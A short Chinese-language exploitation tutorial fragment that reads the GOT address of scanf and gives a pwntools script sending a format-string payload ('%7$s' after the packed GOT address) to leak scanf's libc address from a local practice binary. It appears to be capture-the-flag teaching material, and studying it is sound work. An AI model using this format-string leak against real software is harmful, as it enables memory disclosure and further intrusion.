查看`got`中`scanf`的地址：

`[0x804a014] __isoc99_scanf@GLIBC_2.7 -> 0xf7e5e0d0 (__isoc99_scanf)`

取`scanf`的地址：

```python
from pwn import *

context.log_level = 'debug'

sh = gdb.debug("./a.out", "b *printf")
elf = ELF("./a.out")

scanf_got = elf.got['__isoc99_scanf']
print("scanf_got:%x" % scanf_got)
payload = flat([
    p32(scanf_got),
    b'%7$s\n',
])

sh.send(payload)
print(sh.recv())
sh.interactive()
```
